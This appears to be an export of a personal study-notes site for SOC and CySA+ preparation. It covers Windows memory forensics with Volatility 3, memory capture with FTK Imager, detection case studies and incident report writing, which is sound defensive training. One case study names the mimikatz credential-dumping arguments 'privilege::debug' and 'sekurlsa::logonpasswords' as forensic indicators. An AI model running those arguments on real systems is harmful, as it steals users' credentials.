relationships can provide valuable clues for tracking down malware.\nWith Volatility 3 “windows.pslist”, “windows.pstree”, “windows.psscan” plugins you can view and analyze running processes.\nThe information in the details of the Windows.pslist plugin output is as follows:\nPID: Process Identifier is the unique number of the process.\nPPID: Parent Process Identifier is the PID of the parent process that started the process.\nImageFileName: The name of the process.\nOffset(V): The virtual offset value that indicates the location of the process in memory in the virtual address space.\nThreads: The number of threads contained in the process.\nHandles: The number of references to system resources like open files, registry keys, network connections, etc.\nSession: The session number the process belongs to.\nWow64: Shows whether the process is running on the Windows-on-Windows 64-bit subsystem. This usually indicates whether a 32-bit application is running on a 64-bit system.\nCreatedTime: The date and time when the process was created.\nExitTime: If the process was killed, this field displays the time at which the process was killed. If the process is still running, this field contains “N/A” (not available).\nFile Output: Shows whether exported file information about the process is available or not. A status of “Disabled” indicates that the export of this information is blocked.\nUsing all the above details, the executed commands need to be analyzed one by one, and if there are abnormal commands, the digital forensics process is continued specifically for those commands.\n                `python.exe .\\vol.py -f ..\\mimi.mem windows.pslist`\n              \n\n\nNetwork Connections\nBy examining active and past network connections, it is possible to determine which external servers are communicating through the system. This type of analysis plays a critical role in detecting data breaches or connections to command and control (C2) servers. A detailed examination of open ports and network traffic can detect external cyber-attacks or unauthorized remote access.\nWith the “windows.netscan” plugin included in Volatility 3, you can view and analyze currently active network accesses on the memory dump. The details of this output is as follows:\nOffset: The hexadecimal offset that indicates the location of the network connection object in memory.\nProtocol: The protocol in use (e.g., TCPv4, UDPv4, etc.).\nLocalAddr: The IP address of the local machine.\nLocalPort: The port number used by the local machine for communication.\nForeignAddr: The IP address of the remote machine.\nForeignPort: The port number of the remote machine.\nState: The state of the network connection (e.g. “ESTABLISHED” means that the connection is active, “LISTENING” means that the port is in listening mode).\nPID: The process identifier number of the process that established the connection.\nOwner: The file name of the process that established the connection.\nCreated: The date and time the connection was created.\n                `python.exe .\\vol.py -f ..\\mimi.mem windows.netscan`\n              \n\n\nFor example, the “findstr” command can be used to apply a filter to find the process communicating with a specific IP address.\n                `python.exe .\\vol.py -f ..\\mimi.mem windows.netscan | findstr &quot;172.16.8.132&quot;`\n              \n\n\nRegistry Analysis\nRegistry analysis is critical in the digital forensics process because the registry contains extensive information about operating system configuration, system and user settings, installed applications, and hardware. Malicious software and user activities often leave traces in the registry, so registry analysis plays a critical role in helping to trace system changes, user activities, and system events and identify malicious actions. Registry information is also used to create a timeline of events and gather important system information such as user accounts and network settings.\nThe “windows.registry.hivelist” plugin lists the registry hives that are active in memory. A hive is a file that contains a specific part of the registry (for example, HKEY_LOCAL_MACHINE or HKEY_USERS). The HiveList plugin provides the physical addresses of these hives in memory, what files they correspond to, and their paths in the system. In short, it is used to determine which registry files are loaded in memory and where they are located.\nThe “windows.registry.hivescan” plugin scans the registry structure in memory and detects potentially unusual or hidden hives. The plugin is used to find hives that are not loaded or visible when standard listing techniques are used. This is especially important in cases where malware or the user attempts to erase its traces, as such actions can leave hidden or half-erased hives in the registry structure.\n                `python.exe .\\vol.py -f ..\\memdump.mem windows.registry.hivelist`\n              \n\n\nImportant registry values should be checked and examined for anomalies during the digital forensics process.\nSome registry values that are considered to be important are as follows:\nRun keys:   The programs that start automatically when the user logs on or during system startup (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).\nServices: Details of system services and drivers. Malicious services can be hidden here (HKLM\\System\\CurrentControlSet\\Services).\nShell extensions: The items that are added to the system shell. They can be checked to verify that they are not malicious. (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions)\nMounted devices: The records of mounted devices in the system that help identify mounted devices. (HKLM\\System\\MountedDevices)\nUserAssist Keys: A list of programs started by users, which can be used to analyze user behavior. (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist)\nFile Analysis\nThe next step is the examination of the file and directory structures on the system. Files left behind by malware, temporary files, or files that have been deleted but are still in RAM can be critical to understanding how the incident unfolded.\nVolatility3 uses the “windows.filescan” plugin to scan file objects in the memory dump. This plugin lists the file objects managed by the operating system and provides the analyst with the file objects’ in-memory addresses, file names, and other associated information. In addition, you can get information about files that are deleted or hidden, when these files were created, modified, or accessed, and where these files are located in memory.\n                `python.exe .\\vol.py -f ..\\memdump.mem windows.filescan`\n              \n\n\nMalware Analysis\nAt this step, the memory dump is examined for malware artifacts. Malware often uses sophisticated techniques to disguise itself, so a detailed scan for signatures, hidden processes, or malicious loading mechanisms is a must.\nThe “windows.vmayarascan” plugin included in Volatility 3 is a vital plugin to check for potential threats or important information in the memory dump.\n                `python.exe .\\vol.py -f ..\\memdump.mem yarascan.YaraScan --yara-file .\\yara\\search_mimikatz.yar`\n              \n\n\nThe contents of “search_mimikatz.yar” are as shown below:\n\nService Analysis\nOn Windows systems, services typically run as background processes that keep the operating system and applications running properly.\nHowever, malware can masquerade as legitimate services or modify legitimate services to create malicious functions. Therefore, it is critical to perform a “service analysis” in Windows forensics to identify malicious or suspicious service configurations, modified service paths, services from unknown distributors, and services that are causing unusual network activity.\nVolatility 3’s “windows.svcscan” plugin lists all system services and their information, service file path, configuration details, and status. It provides important information such as the running state of services, startup types, binary file paths, and service names. It is also used to detect malicious or suspicious service configurations.\nThe following details are included in the output of this plugin:\nOffset: The address of the service in the registry or system memory. This address can be used to directly access the service’s structural information.\nOrder: The order in which services are started. Specifies the order in which services are started when the system is initialized or when services are started on demand.\nPID: The process ID (PID) of the service. An “N/A” means that the service has no process ID or is running as a system service in the background.\nStart: The start type of the service. Examples are given below:\n\nSERVICE_DEMAND_START: The service is started manually when required.\nSERVICE_SYSTEM_START: The service starts automatically at system startup.\n\nState: The current state of the service. Examples are given below:\n\nSERVICE_STOPPED: The service is currently stopped.\nSERVICE_RUNNING : The service is running.\n\nType: The type of service that determines the category in which the service operates. Examples are given below:\n\nSERVICE_KERNEL_DRIVER: A driver running at the kernel level.\nSERVICE_FILE_SYSTEM_DRIVER: A driver that handles file system operations.\nSERVICE_WIN32_SHARE_PROCESS: A Win32 service where multiple services run in the same process.\n\nName: The system-defined name of the service. It usually refers to the functions of the service or the components it handles.\nDisplay: The name of the service as it is presented in user interfaces. It is the more comprehensible name that appears in service management tools or system configuration panes.\nBinary: The path to the executable file for the service. N/A means that no executable file exists for the service or that this information cannot be accessed. For service drivers, paths such as “\\Driver” or “\\FileSystem” are usually displayed.\n                `python.exe .\\vol.py -f ..\\mimi.mem windows.svcscan`\n              \n\n\nThe various factors to look for to detect abnormal services are as follows:\nAbnormal behavior: Anomalies such as a service that would normally start with ‘SERVICE_SYSTEM_START’ being set to ‘SERVICE_DEMAND_START’ can be indicative of malicious changes. In particular, watch for changes in critical system service startup types.\nUnexpected situations: The unexpected stopping (SERVICE_STOPPED) of services, especially security-related services, may indicate malicious activity on the system.\nAbnormal service types: If critical service types such as SERVICE_KERNEL_DRIVER or SERVICE_FILE_SYSTEM_DRIVER have unexpected names or configurations, you should investigate their behavior.\nSuspicious names: Unknown or unusual service names, especially if they are spelled similarly to known service names (e.g., “Netmaan” instead of “Netman”), can be a sign that malware is attempting to impersonate these services.\nInvalid paths: Check the paths where the service executables are located. If these paths are outside the system directories or in unusual locations (such as temporary file directories), this may indicate the presence of a malicious service.\nUnusual services: In order to detect anomalous services, familiarity with the normal state of the system is critical. For example, you can identify suspicious services that have been added or modified by comparing them to a list of default services that are expected to run after installing an OS.\nConclusion\nMemory dump analysis reveals potential threats, anomalies, and user activity on the system using tools such as Volatility 3. The findings should be reported in detail to determine the nature of the event and security-related issues."},"SOC/Cysa+-Prep/Windows-Memory-Forensics/Capturing-Memory-Dumps":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/Capturing-Memory-Dumps","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/Capturing Memory Dumps.md","title":"Capturing Memory Dumps","links":[],"tags":[],"content":"On Windows systems, memory dumps, which are snapshots of the system memory (RAM) stored on disk for later analysis, are essential for forensics and debugging.\nThis is especially important when the system is rebooted because the information stored in memory is lost when the system is rebooted. Therefore, it is important to take a snapshot of memory and store it securely for later access for error analysis or forensic investigation.\nMemory data can contain critical information about running programs, user activity, system status, and potentially malicious software. Therefore, a fundamental step in preserving the integrity of information for future analysis is to securely store it in memory before it is lost.\nSome memory dump tools that can be used for memory forensics on Windows systems include:\nWinDbg (Windows Debugger)\nIt is a tool developed by Microsoft that offers in-depth debugging and analysis capabilities in the Windows operating system. It provides extensive features for opening and analyzing memory dump files.\nVolatility Framework\nAn open-source memory analysis framework whose plugins can examine Windows memory dump files and provide a variety of analysis options to extract OS-specific artifacts.\nMagnet RAM Capture\nIt is a fast and efficient memory dump capture tool. Thanks to its simple interface, it can be easily used by all user levels and can quickly capture the contents of RAM.\nBelkasoft Evidence Center\nIt is a comprehensive digital forensic tool that can analyze a wide range of digital artifacts, including memory dump files.\nAccessData FTK Imager\nKnown for its disk imaging and analysis capabilities, it can also view memory dump files and perform simple analysis.\nRekall (previously Volatility Fork)\nAn open source and advanced memory forensics framework branched off from Volatility, known for its more advanced analysis capabilities.\nMemDump\nIt is a simple command-line tool that can quickly dump the contents of RAM to disk in raw format.\nThere are several reasons why memory dumping is critical to forensic analysis. Digital forensics is about collecting, preserving, analyzing, and reporting data from digital devices for forensic analysis. When doing so, taking a memory dump provides a frozen snapshot of the current state of the system that contains important information on several fronts. The information includes:\nRunning programs and processes: A memory dump contains a detailed list of all programs and processes running on a system. This information can be used to detect the presence of malware or malicious processes on the system.\nSystem errors: When system errors or crashes occur, the memory dump can provide critical information to understand the causes of these events. Faulty code pieces, memory leaks, or incompatible drivers can cause these problems.\nNetwork Connections: Network information such as active network connections and open ports can be extracted from the memory dump. This is important to determine which external servers the system is communicating with or malicious network activity.\nUser activity and session information: User activity such as system logins, file access, and session information can be stored in the memory dump. This can be particularly valuable in analyzing unauthorized access or insider threats.\nCryptographic keys and sensitive data: In some cases, cryptographic keys, passwords, and other sensitive information can be extracted from the memory dump and used to gain access to protected data or decrypt encrypted communications.\nMalware analysis: To avoid detection, malware often uses a variety of techniques. Memory dump provides a rich resource for analyzing the presence and behavior of such software.\nIn summary, Memory dumps are invaluable for digital forensic investigations, understanding criminal activity, assessing system security, and responding to potential breaches. Therefore, it is possible to say that memory dump plays a critical role in forensic analysis.\nUsing FTK Imager to Capture Memory from Windows System\nAfter opening the AccessData FTK Imager application, select “File” → “Capture Memory” to start the image capture process.\n\nTo start the memory dump process, specify the path and name of the memory image to be captured and click the Capture Memory button.\nInclude Pagefile : In Windows operating systems, when there is not enough space in physical RAM, the operating system uses a file on disk (usually C:\\pagefile.sys) as virtual memory. So if you want to include this area in the image, the “Include pagefile” option should be selected.\n\nYou can access the dump file by going to the path you specified after the image import is complete.\n\nConclusion\nMemory dump is important for detecting and analyzing malware and security breaches because it contains critical information about running programs, user activity, system errors, and network connections. Various tools (WinDbg, Volatility Framework, Magnet RAM Capture, etc.) can be used for memory forensics analysis and detailed system examination. Tools such as AccessData FTK Imager allow for more comprehensive analysis by taking a memory dump and including the pagefile file with the “include pagefile” option. Forensics utilize these tools to understand criminal activity, assess system security, and respond to potential security breaches."},"SOC/Cysa+-Prep/Windows-Memory-Forensics/Case-Studies-and-Practical-Examples":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/Case-Studies-and-Practical-Examples","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/Case Studies and Practical Examples.md","title":"Case Studies and Practical Examples","links":[],"tags":[],"content":"In this lesson, we will examine real-world scenarios and practical examples related to Windows memory forensics. This chapter uses real-world cases to demonstrate how digital forensics processes are implemented, how various challenges are overcome, and how the results are evaluated.\nUse Case-1\nCase : Detecting Port Scan Activity\nDetails : Port scanning is a technique used to determine which ports are open on devices on a network. Malicious actors can use this information to identify vulnerabilities in target systems and expand their attack surface.\nDetection : To detect port scanning activity during memory dump analysis, the “windows.pslist”, “windows.cmdline”, or “windows.netscan” plugins can be used with Volatility3.\nWhen analyzing processes with the “windows.pslist” plugin, the “nmap.exe” process stands out, which can be used for “port scanning”.\n                `python.exe .\\vol.py -f ..\\nmap.mem windows.pslist`\n              \n\n\nAll the details of the nmap command can be viewed by examining the PID (process ID) number “7356” of the associated “nmap.exe” process with the “windows.cmdline” plugin.\n                `python.exe .\\vol.py -f ..\\nmap.mem windows.cmdline --pid 7356`\n              \n\n\nUse Case-2\nCase : Detecting Brute Force Attacks\nDetails : As the name implies, brute-force attacks use brute-force methods to guess credentials such as usernames and passwords. This type of attack typically involves many rapid and successive login attempts.\nDetection : The “windows.cmdline” and “windows.netscan” plugins can be used with Volatility3 to detect brute-force activity during memory dump analysis.\nUpon execution of the “netscan” plugin and examination of the output, it is apparent that there are too many SYN_SENT packets. This may be port scan activity, but the associated PID should be analyzed to be sure.\n                `python.exe .\\vol.py -f ..\\thc.mem windows.netscan`\n              \n\n\nAn SSH brute-force attack using the “hydra” tool is detected by examining the PID that generated the relevant network packets.\n                `python.exe .\\vol.py -f ..\\thc.mem windows.cmdline --pid 7176`\n              \n\n\nUse Case-3\nCase : Detecting Credential-Dumping\nDetails : Credential dumping is the process of obtaining credentials (such as passwords and keys) from a system. Malware and attackers can use this information to gain access to other systems.\nDetection : To detect credential dumping activity during memory dump analysis, the “windows.pslist” and “windows.cmdline” plugins can be used with Volatility3.\nWhen examining the processes with the “windows.pslist” plugin, the process “mimikatz.exe” that may be used in the “credential dumping” activity is conspicuous.\n                `python.exe .\\vol.py -f ..\\mimi2.mem windows.pslist`\n              \n\n\nExamining the PID (process ID) number “6676” of the corresponding “mimikatz.exe” process with the “windows.cmdline” plugin shows all the details of the “mimikatz” command. The “privilege::debug” and “sekurlsa::logonpasswords” parameters indicate credential dumping activity when the command args are examined.\n                `python.exe .\\vol.py -f ..\\mimi2.mem windows.cmdline --pid 6676`\n              \n\n"},"SOC/Cysa+-Prep/Windows-Memory-Forensics/Introduction-to-Windows-Memory-Forensics":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/Introduction-to-Windows-Memory-Forensics","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/Introduction to Windows Memory Forensics.md","title":"Introduction to Windows Memory Forensics","links":[],"tags":[],"content":"In the ever-evolving landscape of the digital world, cybersecurity and forensics have become more critical than ever. In this dynamic environment, Memory Forensics” has emerged as an indispensable tool for investigating cybercrimes and security breaches. The development of memory forensics capabilities on Windows operating systems has provided professionals with the ability to identify, analyze, and respond to these threats more effectively.\nMemory forensics refers to the detailed examination of a system’s physical memory (RAM) and is critical to understanding the current state of a computer or what operations it has performed in the past. In situations such as system crashes, malware attacks, or other security breaches, data stored in RAM can contain vital information. The Windows Memory Forensics course provides a comprehensive understanding of how to access, analyze, and report on this valuable data.\n\nWindows memory forensics involves retrieving data from memory on on-site or remote systems, performing memory analysis using available tools and techniques, and processing and interpreting the results according to digital forensics standards. This process often helps to uncover critical data in a variety of scenarios, such as when processes contain malware, extracting encryption keys from memory, gathering transaction information, and monitoring other user activity. To be effective and successful, forensic analysts must understand the memory structures and processing mechanisms specific to the Windows operating system.\nRequired Tools\nIn this Windows memory forensics course, the AccessData FTK Imager is used to capture a memory dump, and Volatility3 tools are used to analyze the memory dump. The purpose and installation of these tools are provided below.\nAccessData FTK Imager\nAccessData FTK Imager is an industry-standard software product that provides digital forensic professionals with a powerful suite of tools. It allows users to create, examine, and analyze data images from a variety of media and file systems, including hard drives, USB sticks, CD/DVDs, SAN, RAID, Jaz/Zip disks, and even RAM. Images created with FTK Imager allow for detailed examination of digital evidence while preserving its integrity. This is critical in forensic processes because the admissibility of the data as evidence in court depends on how it was collected and processed.\nThe FTK Imager has an easy-to-use interface that saves forensic experts time and effort in collecting, analyzing, and reporting digital evidence. With the ability to open image files, view their contents, and extract critical data, the software helps users complete their work quickly and efficiently. In addition, FTK Imager has the ability to verify file integrity using MD5 and SHA1 hash values, which plays an important role in proving the integrity and authenticity of the data collected.\nThe installation of Volatility3 on Windows Server 2019 can be done as shown in the screenshot below:\nThe installation file can be obtained by filling out the form at the following address:\nwww.exterro.com/ftk-product-downloads/ftk-imager-version-4-7-1\nNote : Since the installation steps are simple, they will not be listed in detail.\nIn short, the installation steps are as follows:\n\n\nLaunch the installation wizard.\n\n\nAccept the license agreement.\n\n\nChoose the installation directory.\n\n\nThe installation is completed.\n\n\nAfter the installation, you can open the application and start using it.\n\nWe will discuss image acquisition with the AccessData FTK Imager in the next lesson.\nVolatility3\nVolatility is an open-source memory analysis application. It is available for both Linux and Windows environments. Volatility is a powerful tool for analyzing the information contained in the RAM of operating systems. Compatible with a wide range of operating systems and memory dump formats, Volatility provides a comprehensive framework for memory analysis. It is written in Python and has an extensive library of plug-ins.\nVolatility is used to analyze memory dumps obtained with tools such as LiME. It allows users to list DLLs, processes in RAM, network connections, open files, registry keys, and more. It can also be used to detect malware, search for hidden code, and analyze general user activity on the system. Volatility is one of the most widely used memory forensics tools and is essential for performing detailed memory analysis.\nVolatility3 can be installed on Windows Server 2019, as shown in the screenshot below:\nNote : Python3 or a higher version of Python must be installed on the system to use Volatility3.\nFirst, install python3.\nNote: This section does not describe the installation process in detail, as it consists of simple steps.\nAfter having installed Python, please check the version:\n\nInstall the Python “snappy” module. You can download the built version from: pypi.org/project/python-snappy/#files\nTo install, use the following command:\n                `pip install .\\python_snappy-0.7.1-py3-none-any.whl`\n              \n\n\nThen download Volatility3.\nDownload Volatility3 : github.com/volatilityfoundation/volatility3/releases/tag/v2.5.2\nThe contents of the “requirements.txt” file located in the Volatility installation folder must be installed before using Volatility. Use the following command to install:\n                `pip install -r .\\requirements.txt`\n              \n\n\nTo verify that the Volatility tool has been successfully installed, use the following command:\n                `python.exe .\\vol.py -h`\n              \n\n"},"SOC/Cysa+-Prep/Windows-Memory-Forensics/index":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/index","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/index.md","title":"index","links":["SOC/Cysa+-Prep/Windows-Memory-Forensics/Introduction-to-Windows-Memory-Forensics","SOC/Cysa+-Prep/Windows-Memory-Forensics/Capturing-Memory-Dumps","SOC/Cysa+-Prep/Windows-Memory-Forensics/Analyzing-the-Memory-Dump","SOC/Cysa+-Prep/Windows-Memory-Forensics/Basic-Memory-Analysis","SOC/Cysa+-Prep/Windows-Memory-Forensics/Case-Studies-and-Practical-Examples"],"tags":[],"content":"1. Introduction to Windows Memory Forensics\n2. Capturing Memory Dumps\n3. Analyzing the Memory Dump\n4. Basic Memory Analysis\n5. Case Studies and Practical Examples"},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Introduction-to-Technical-Writing":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Introduction-to-Technical-Writing","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/Introduction to Technical Writing.md","title":"Introduction to Technical Writing","links":[],"tags":[],"content":"One of the most important skills a SOC analyst must possess is the ability to write technical documents. Let’s say you have analyzed an important ransomware case, you did everything as it should be, you identified the root cause of the incident, and took the necessary actions. If you cannot convey this situation to your teammates and management correctly, the process will not be considered complete. Because the rest of the team members could not master the details of the incident due to insufficient communication.\nEveryone knows how important communication is in teamwork, so we won’t emphasize it again and again. The subject of this training is to develop your skills in written communication. Some important issues to consider when writing a technical article/documentation/report:\n\n\nAudience\n\n\nFlow\n\n\nIntelligibility\n\n\nAudience\nKnowing who will read the content we will prepare is important to determine the details of the content. For example, let’s say we are preparing an incident report that the CEO wants to read, your CEO’s cybersecurity technical level may not be as deep as yours. Some details that are important to you (MITRE techniques, IOC, etc.) may be meaningless to the target audience. For this reason, it is necessary to create a report that appeals to people.\nFlow\nRegardless of who will read your report, your report should have a flow. It would not be appropriate to give some information about the end of the Incident and then explain the beginning and create confusion. For this reason, it is necessary to prepare a sequential report with a certain flow. Thus, the reader can create the timeline in his head.\nIntelligibility\nThe sentences we use should be understandable to the reader. We should not complicate the understanding of the report by using complex, inverted sentences.\nIf we pay attention to these issues in general, we can say that a successful report will emerge.\nWhy Do We Write Reports?\nThere is no single reason to create a report. Sometimes due to legal obligations, sometimes due to the request of the administrator, a report can be created. Even if there are no situations that require us as analysts to write a report, we should write a report of the events we examine.\nThink of an incident you analyzed two months ago. How much detail can you remember about that situation? Assuming you review dozens of alerts every day, you can’t remember much. When a new situation arises about the incident you examined two months ago, you will probably be the person your manager will want to get details from. However, if you do not have a written report or note, it will not be easy for you to respond.\nOr imagine making a job change. You have all the information about the analysis you have done, the team has no idea about these situations. Such situations affect the transfer of information within the team in a negative way.\nIn short, writing a good report is important and must be written for the well-being of both the individual and the team. Although it is often seen as a waste of time and neglected, it provides the solution to many problems that may be seen in the future."},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Formatting":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Formatting","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/Report Formatting.md","title":"Report Formatting","links":[],"tags":[],"content":"When creating a professional report content, it is necessary to set standards on issues such as date, font, text color, tables, and references.\nDate and Time\nThe same format should always be used when writing date information. For example, after specifying a date with “June 16, 2022”, a format like “16/06/2022” should not be used. Standards should be maintained, using the same format over and over.\nIn terms of time, timezone information should be shared and the same timezone value should be used. A timezone value other than GMT+2 should not be used in the continuation of a report that starts with 06:12 GMT+2. Confusion may occur when used, and various calculations have to be made to better understand the report.\nFont\nIt is important to choose a font that is readable and formal. Font selections such as “Comic Sans” should be avoided even though they are pleasant but not official. Multiple font selection should not be an issue as long as consistency is maintained. For example, all the paragraphs of the report can be written in “Arial” font, while the headings can be written in “Verdana”.\nTable and Visual Usage\nAppropriate use of tables are very important for the reader. If you want to list more than one content with more than one feature, the tables will help you. For example, you can show the list of hosts captured by the attacker with a table. You can also share the hostname and IP information of the host. Sample:\n\nData Details\nIf detailed information about the data is to be shared, the same details should be added for all data. For example, if the SHA256 hash of the “mimikatz.exe” file used by the attacker, file name, creation date, and path information is added to the report, the same data should be shared for other files used by the attacker.\nLists\nYou can use bullet or numbered lists for long lists that you do not want to write in paragraphs. For example:\n\n\nmimikatz.exe\n\n\nnc.exe\n\n\n\n\nSusieHost\n\n\nGitServer\n\n\nWeb-Server\n\n"},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Templates":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Templates","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/Report Templates.md","title":"Report Templates","links":[],"tags":[],"content":"In order to prepare consistent reports, reports should follow an ordered template. This section will talk about the points you need to pay attention to when preparing an incident report template.\nTable of Contents\nThis is the section that specifies the content of the report. The titles and page numbers of the pages are specified. If there is a part that the reader wants to reach directly, he can use this part.\nIncident Background\nThis is the section that explains how an Incident is detected, what is detected first, and what actions are taken. Time information should also be shared while describing events. It doesn’t need to be too long, a few paragraphs of explanation will suffice.\nFindings\nThis is the section where the findings we detected during the investigation will be explained.\nRecommendations\nThis is the section where long and short-term recommendations will be shared regarding the incident. For example, for a system affected by the MS17-010 vulnerability, a quick update may be a short-term recommendation, while investing in EDR solutions may be a long-term recommendation. It is a very important section for teams/persons who are not experts in the subject and will take action against this situation.\nTimeline\nThis is the section in which the event is sorted by time. There is no need to share all the details of the event, just focus on the important parts. The aim is to quickly convey how and at what time the event occurred in general.\nThe time formats given in this section should be fixed. While giving a time in UTC format in the first stage, using a format like GMT+3 afterward will cause confusion.\nAppendices\nIt is often used for long listings. If the list that needs to be shared is more than one page and affects readability, it can be shared in the appendix. For example, the IP list the attacker is port scanning.\nIn general, we talked about which sub-headings/sections should be in a report and their details. Now you have important ideas about what parts you should focus on when preparing a report."},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Standards":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Standards","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/Reporting Standards.md","title":"Reporting Standards","links":[],"tags":[],"content":"The reports we will prepare must have a certain standard. Thus, the reader can guess whether the information they want is in the report or not, without reading the report, and can quickly reach the result if they are looking for just one piece of information. For example, an administrator who is curious about the root cause of the incident can quickly open and read the relevant section of the report. Otherwise, the entire report should have been read in detail. In this section, we will explain which topics we should pay attention to and touch on in general and technical (cyber security) in order to create a standard while writing a report.\nIntelligibility\nAs we mentioned in the Introduction section, content should be prepared according to the readership of the report. In a report to be sent to the CEO of the company, it will not be necessary to mention technical issues such as MITRE techniques and hacking tools used by the APT group. Therefore, you can create an “Executive Summary” section in the report and write a summary of the incident without mentioning the cyber security techniques.\nTimeline\nOur report should proceed according to a certain timeline. It should be stated step by step what the attackers and the SOC team did on what date. The reader should feel himself in a short film. Thus, such questions are avoided: What did our team do while the attackers were doing activity X? When did you block the X.X.X.X IP address? etc.\nRepeatability\nThe technical details in the report should be written in a way that can be repeated. Let’s say you find malware hidden on the server and add that file to the report that it exists. If you do not specify the methods and techniques you used to find this hidden file, the person(s) reading the report cannot perform these activities again. If the same incident happens again on a different date, the analyst reading the report will be wasting time because he or she will not be able to apply the same steps again.\nFocus on a single subject\nThe subject of your content should be fixed. If you are preparing an incident report, you should not mention matters unrelated to the incident. Thus, the subject’s integrity is ensured and a more easily understandable report emerges."},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Style":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Style","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/Reporting Style.md","title":"Reporting Style","links":[],"tags":[],"content":"Past Tense Patterns\nWhile preparing the report, you should prepare your sentences using past tense patterns. The main reason for this is that the event happened in the past.\nShort and Concise Sentences\nYour sentences should be clear, short, and concise. As a result, you are preparing a report, not a novel, and you need to convey the information to the reader as soon as possible.\nFor example, instead of saying “Mysterious and frightening hacker group, whose identity is unknown, made SQL injection attempts on the team’s favorite server, and failed against the security of our server”, you can say “The attacker(s) of unknown origin attempted SQL injection on the web server and failed”. A short and clear sentence can be formed.\nShare Important Details\nDo not hesitate to share data that may be necessary when making a statement about a topic. “We have detected various malware on our servers.” sentence will not be enough for the SOC team. It is not clear what type of malware was detected on which server. “Mimikatz.exe malicious software that is used to capture user passwords has been detected on our web servers with IP addresses 192.168.10.15 and 192.168.10.16.” When you read this sentence, you can understand exactly what kind of threat is on which server.\nFocus on What You Do\nIn the report, you should mention the events that took place. For example, if you did not perform a memory analysis in the system, there is no need to specify that there is no memory analysis unless there is a very special situation. If giving this detail is important for the content of the report, information should be given about why the transaction could not be performed.\n“The data in memory was lost because the operating system was restarted by the attacker, so memory analysis could not be performed.” A sentence created in this way is meaningful because it depends on the cause and effect relationship and can be found in the report.\nBe Careful When Using Abbreviations\nToo many abbreviations are used in the cybersecurity world. Some of them are IOC, IDS, IPS, AV, EDR, etc. While these abbreviations may sound familiar to you, they may be meaningless to others, so you should specify the explanation when using them for the first time. For example, if you are using IOC for the first time in the report, you should write it as IOC (Indicator of Compromise). This way, the reader will better understand what you mean.\nShow Consistency in Using Words\nFor example, when describing a device at the beginning of the report, when using the word “host”, instead of using different words such as “endpoint”, “system”, or “node” in a different part, it is necessary to use “host” continuously."},"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/index":{"slug":"SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/index","filePath":"SOC/Cysa+ Prep/Writing a Report on Security Incident/index.md","title":"index","links":["SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Introduction-to-Technical-Writing","SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Standards","SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Reporting-Style","SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Formatting","SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/Report-Templates"],"tags":[],"content":"1. Introduction to Technical Writing\n2. Reporting Standards\n3. Reporting Style\n4. Report Formatting\n5. Report Templates"},"SOC/Cysa+-Prep/index":{"slug":"SOC/Cysa+-Prep/index","filePath":"SOC/Cysa+ Prep/index.md","title":"index","links":["SOC/SOC-Analyst-Notes/","Malware-Analysis/Malware-Analysis","SOC/Cysa+-Prep/Network-Design-and-Security-Products/","SOC/Cysa+-Prep/Secure-Network-Design/","SOC/Cysa+-Prep/Linux-Memory-Forensics/","SOC/Cysa+-Prep/Windows-Memory-Forensics/","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/","SOC/Cysa+-Prep/SOAR-Fundamentals/","SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/","SOC/Cysa+-Prep/Incident-Response-on-Linux/","SOC/Cysa+-Prep/Incident-Response-on-Windows/","SOC/Cysa+-Prep/Writing-a-Report-on-Security-Incident/"],"tags":[],"content":"1. SOC Analyst Stuff\n2. Malware Analysis Stuff\n3. Network Design and Security Products\n4. Secure Network Design\n5. Linux Memory Forensics\n6. Windows Memory Forensics\n7. SIEM Basics, Installation and Configuration\n8. SOAR Fundamentals\n9. Threat Hunting and IR with XDR-EDR\n10. Incident Response on Linux\n11. Incident Response on Windows\n12. Writing a Report on Security Incident"},"SOC/HomeLab/Home-Lab-Plan":{"slug":"SOC/HomeLab/Home-Lab-Plan","filePath":"SOC/HomeLab/Home Lab Plan.md","title":"Home Lab Plan","links":[],"tags":[],"content":"SOC Home Lab Detailed Plan\n\n1. Overview\nBuild a state-of-the-art SOC home lab prototype hosted on VMware with:\n\nWazuh: Centralized logging, host-based detection, file integrity monitoring\nSuricata: Network IDS/IPS, detects network threats with signatures\nZeek: Network traffic analysis, extracts detailed metadata &amp; detects anomalies\nNext-Gen Firewall (pfSense/OPNsense): Controls perimeter traffic, IDS/IPS, logs all network activity\nThreat 